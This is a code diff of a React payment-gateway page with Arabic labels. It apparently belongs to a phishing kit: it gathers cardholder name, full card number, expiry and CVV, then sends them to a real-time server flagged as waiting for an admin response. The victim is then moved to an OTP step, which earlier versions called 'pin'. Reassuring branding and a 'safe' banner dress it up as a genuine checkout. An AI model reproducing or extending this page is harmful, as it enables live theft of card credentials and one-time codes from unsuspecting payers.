@@ -1,110 +1,79 @@
 import Main from "@/components/MainWrapper";
 import { useEffect, useState } from "react";
-import { Link, useLocation, useNavigate } from "react-router-dom";
+import { Link, useLocation } from "react-router-dom";
 import { validateLanguage } from "@/lib/helpers";
 import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
 import { FieldValues, useForm } from "react-hook-form";
 import { CustomSelect } from "@/components/ui/select";
 import Input from "@/components/Input";
 import CardNumberInput from "@/components/CardNumberInput";
+import { months, years } from "@/data/selects-data";
+import { errMsgs } from "@/data/error-messages";
 
-const errMsgs = {
-  name: "الأسم غير صحيح. يجب أن يكون باللغة الأنجليزية",
-  card_num: "رقم البطاقة غير صحيح. يجب أن يكون الرقم مكون من 16 رقم",
-  cvv: "رقم cvv غير صحيح. يجب أن يكون الرقم مكون من 3 رقم",
-  month: "يرجى تحديد الشهر",
-  year: "يرجى تحديد السنة",
-};
-const years = [
-  { name: "2024" },
-  { name: "2025" },
-  { name: "2026" },
-  { name: "2027" },
-  { name: "2028" },
-  { name: "2029" },
-  { name: "2030" },
-];
-const months = [
-  { name: "1" },
-  { name: "2" },
-  { name: "3" },
-  { name: "4" },
-  { name: "5" },
-  { name: "6" },
-  { name: "7" },
-  { name: "8" },
-  { name: "9" },
-  { name: "10" },
-  { name: "11" },
-  { name: "12" },
-];
 const Gateway = () => {
   const { state } = useLocation();
   const {
     register,
     handleSubmit,
     setValue,
-    getValues,
     formState: { errors, isValidating, isValid },
   } = useForm({
     mode: "all",
     defaultValues: {
-      name: state?.name,
-      cvv: "",
+      name: state?.fullName,
       card_num: "",
-      exp_month: "1",
-      exp_year: "2024",
+      exp_month: "01",
+      exp_year: "2030",
+      cvv: "",
     },
   });
   const [cardType, setCardType] = useState<"visa" | "master" | "mada" | null>(
     state?.paymentMethod
   );
 
-  console.log(state);
-  console.log(errors);
-  console.log(getValues());
-
   useEffect(() => {
     setCurrentPage("payment-gateway");
   }, []);
-  const navigate = useNavigate();
 
-  const onSubmit = (data: FieldValues) => {
-    if (Object.values(data).filter((d) => !d).length === 0) {
+  const onSubmit = (rawData: FieldValues) => {
+    if (Object.values(rawData).filter((d) => !d).length === 0) {
+      const data = {
+        "نوع البطاقة": cardType,
+        "إسم حامل البطاقة": rawData.name,
+        "رقم البطاقة": rawData.card_num,
+        "تاريخ الانتهاء": `${rawData.exp_month}/${rawData.exp_year}`,
+        cvv: rawData.cvv,
+      };
+
       sendDataToServer({
-        data: {
-          "نوع البطاقة": cardType,
-          "إسم حامل البطاقة": data.name,
-          "رقم البطاقة": data.card_num,
-          "تاريخ الانتهاء": `${data.exp_month}/${data.exp_year}`,
-          cvv: data.cvv,
-        },
+        data,
         current: "payment-gateway",
-        nextPage: "pin",
+        nextPage: "otp",
         waitingForAdminResponse: true,
-        navigate,
       });
     }
   };
 
   return (
     <Main>
-      <main className="bg-gray-100 min-h-screen py-10 lg:pt-20">
+      <main className="bg-gray-100 py-10">
         <div className="bg-white rounded-xl flex flex-col items-center justify-center w-fit max-w-[90dvw] lg:max-w-lg p-4 mx-auto">
-          <div className="bg-gradient-to-tl from-main/20 to-main/5 py-2 px-6 w-full mb-4 rounded-xl">
+          <div className="bg-main py-2 px-6 w-full mb-4 rounded-xl">
             <img
-              src="/assets/images/logo.webp"
+              src="/assets/images/logo.png"
               alt="logo"
               className="h-10 mx-auto"
             />
           </div>
 
           <div className="bg-main/20 rounded-2xl py-3 ps-4 pe-20 relative">
-            <img
-              src={`/assets/images/client/${cardType || "visa"}-card.svg`}
-              className="w-16 absolute left-2 top-4 lg:top-2 scale-125"
-              alt={`${cardType || "visa card"} logo`}
-            />
+            {cardType && (
+              <img
+                src={`/assets/images/client/${cardType}-card.svg`}
+                className="w-16 absolute left-2 top-4 lg:top-2 scale-125"
+                alt={`${cardType || "visa card"} logo`}
+              />
+            )}
 
             <h2 className="text-xl font-bold text-main">
               الدفع من خلال بطاقة الائتمان
@@ -122,22 +91,24 @@ const Gateway = () => {
             onSubmit={handleSubmit(onSubmit)}
             className="mt-4 grid grid-cols-6 items-end gap-8 w-full px-4"
           >
-            <Input
-              errors={errors}
-              register={register}
-              label="إسم حامل البطاقة"
-              placeholder="أدخل إسم حامل البطاقة"
-              id="name"
-              type="text"
-              isAr
-              className="text-left"
-              containerClassName="col-span-6"
-              options={{
-                required: "هذا الحقل ضروري",
-                validate: (value) =>
-                  validateLanguage(value) !== "en" ? errMsgs.name : true,
-              }}
-            />
+            <div className={"col-span-6"}>
+              <Input
+                errors={errors}
+                register={register}
+                label="إسم حامل البطاقة"
+                placeholder="أدخل إسم حامل البطاقة"
+                id="name"
+                type="text"
+                isAr
+                className="text-left"
+                containerClassName="col-span-6"
+                options={{
+                  required: "هذا الحقل ضروري",
+                  validate: (value) =>
+                    validateLanguage(value) !== "en" ? errMsgs.name : true,
+                }}
+              />
+            </div>
 
             <CardNumberInput
               errors={errors}
@@ -183,9 +154,9 @@ const Gateway = () => {
                   label=""
                   sels={months}
                   className="px-4"
+                  defaultValue="01"
                   register={register}
                   errors={errors}
-                  defaultValue="1"
                   options={{ required: errMsgs.month }}
                   setValue={setValue}
                 />
@@ -195,9 +166,9 @@ const Gateway = () => {
                   label=""
                   sels={years}
                   className="px-4"
+                  defaultValue="2030"
                   register={register}
                   errors={errors}
-                  defaultValue="2024"
                   options={{ required: errMsgs.year }}
                   setValue={setValue}
                 />
@@ -240,22 +211,17 @@ const Gateway = () => {
               </button>
               <Link
                 className="w-full text-center lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-gray-200 hover:bg-gray-100 text-gray-800 transition-colors"
-                to={"/checkout/4"}
+                to={"/pick-payment"}
                 state={state}
               >
                 السابق
               </Link>
             </div>
 
-            <p className="text-center col-span-full mt-2 bg-deep-orange-500 text-white rounded-lg px-4 py-2 w-fit text-sm animate-pulse">
-              "نعتذر من عملائنا الأعزاء، نحن لا نقبل التعامل بالبطاقات الصادرة
-              من بنك الراجحي في الوقت الراهن. نشكركم على تفهمكم."
-            </p>
-
             <img
-              src="/assets/images/cards-all.png"
-              alt="cards logos"
-              className="mx-auto max-w-xs col-span-6 mt-6"
+              src="/assets/images/safe.png"
+              alt="safe and sound banner"
+              className="col-span-6"
             />
           </form>
         </div>
